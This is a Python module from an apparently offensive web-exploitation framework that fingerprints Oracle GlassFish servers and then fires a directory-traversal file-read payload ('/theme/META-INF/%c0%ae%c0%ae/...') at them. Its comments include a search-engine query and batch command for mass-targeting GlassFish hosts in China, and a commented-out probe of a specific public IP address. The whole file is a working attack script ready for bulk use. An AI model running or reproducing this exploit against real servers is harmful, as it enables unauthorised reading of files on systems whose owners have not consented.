# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-09 13:58

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# app="Oracle-Sun-GlassFish" && country="CN"
# python batch.py -m exploit.web.Glassfish.readfile -cs -fs "app=\"Oracle-Sun-GlassFish\" && country=\"CN\""

class Script(BaseScript):
    name = 'GlashFish'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.READFILE
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/Conf/images/user.gif']
        # exec
        self.execPathList = ['/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/']
        # session
        self.session = session
        # 相关信息
        self.info = 'version 4.1.0'

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.text()
                        xPowerBy = response.headers.get('X-Powered-By')
                        server = response.headers.get('Server')
                        await asyncio.sleep(2)
                        if 'GlassFish' in text \
                                or 'GlassFish' in xPowerBy \
                                or 'GlassFish' in server:
                            self.flag = True
                            tqdm.write(Fore.RED + '[{}] {}'.format('GlashFish Finger', url))
                            return {'name': 'GlashFish Finger', 'url': url, 'software': 'GlashFish'}
        except Exception:
            return None

    async def exec(self):
        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None and response.status == 200:
                        text = await response.text()
                        if 'databases' in text or 'applications' in text or 'templates' in text:
                            tqdm.write(Fore.RED + '[{}] {}'.format('GlashFish ReadFile', url))
                            return {'name': 'GlashFish ReadFile', 'url': url, 'software': 'GlashFish'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    # import requests
    # import hashlib
    # resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)

    semaphore = asyncio.Semaphore(500)
    sc = Script('192.168.4.137:4848', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))
